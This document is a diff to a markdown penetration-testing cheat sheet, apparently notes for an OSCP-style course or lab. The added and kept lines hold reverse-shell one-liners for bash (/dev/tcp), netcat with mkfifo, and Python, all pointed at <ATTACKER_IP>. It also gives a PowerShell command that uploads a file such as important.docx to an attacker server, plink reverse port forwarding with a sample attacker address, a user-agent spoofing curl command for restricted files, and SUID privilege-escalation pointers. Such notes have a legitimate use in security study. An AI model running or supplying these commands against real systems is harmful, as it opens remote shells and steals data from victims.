@@ -105,7 +105,7 @@
     * To access restricted files in some cases:
 
         ```
-        curl -iv -A "Googlebot/2.1 (+http://www.googlebot.com/bot.html)" http://10.11.1.39/robots.txt)" http://<IP>/<RESTRICTED_FILE>
+        curl -iv -A "Googlebot/2.1 (+http://www.googlebot.com/bot.html)" http://<VICTIM>/robots.txt)" http://<IP>/<RESTRICTED_FILE>
         ```
     
     * Shellshock simple (remember to configure listenner):
@@ -119,16 +119,32 @@
         
 ## Reverse Shell
 
-* Netcat OpenBSD (and also some Linux)
+* Most frequently used (bash):
+    ```
+    bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+    ```
+
+    ```
+    0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<PORT>; sh <&196 >&196 2>&196
+    ```
+
+    ```
+    /bin/bash -l > /dev/tcp/<ATTACKER_IP>/<PORT> 0<&1 2>&1
+    ```
+
+* Netcat OpenBSD (and also some Linux). In case nc doesn't have `-e` option or is blocked:
 
     ```
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
     ```
+
 * Python:
 
     ```
     export RHOST="<ATTACKER_IP>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
     ```
+
+* Windows powershell: /*TODO*/
 
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
@@ -160,7 +176,7 @@
 
     * Upload files:
 
-        Page 486-487. **You prepared the environment already**:
+        Page 486-487. **You prepared the environment already** (see /var/www/ folder):
     
         ```
         powershell (New-Object System.Net.WebClient).UploadFile('http://<ATTACKER_IP>/upload.php', 'important.docx')
@@ -184,7 +200,7 @@
     
     * Command:
         ```
-        cmd.exe /c echo y | plink.exe -ssh -l [ATTACKER_USER] -pw [ATTACKER_PASSWORD] -R [ATTACKER_IP]:[ATTACKER_PORT]:127.0.0.1:[VICTIM_LOCAL_OPEN_PORT] [ATTACKER_IP]
+        cmd.exe /c echo y | plink.exe -ssh -P <SSH_PORT_ON_ATTACKER> -l [ATTACKER_USER] -pw [ATTACKER_PASSWORD] -R [ATTACKER_IP]:[ATTACKER_PORT]:127.0.0.1:[VICTIM_LOCAL_OPEN_PORT] [ATTACKER_IP]
         ```
 
         Example:
@@ -192,6 +208,7 @@
         cmd.exe /c echo y | plink.exe -ssh 10.10.14.16 -P 22022 -l attacker_username -pw RandomPassword123 -R 10.10.14.16:1234:127.0.0.1:8888
         ```
 
+    * You will be able to attack from your attacker machine targeting **localhost**.
 
 
 
@@ -350,6 +367,7 @@
     * https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/
 
 * Privesc using SUID binaries:
+    From LinEnum.sh output always look carefully to SUID and SGID list!
     * https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
 
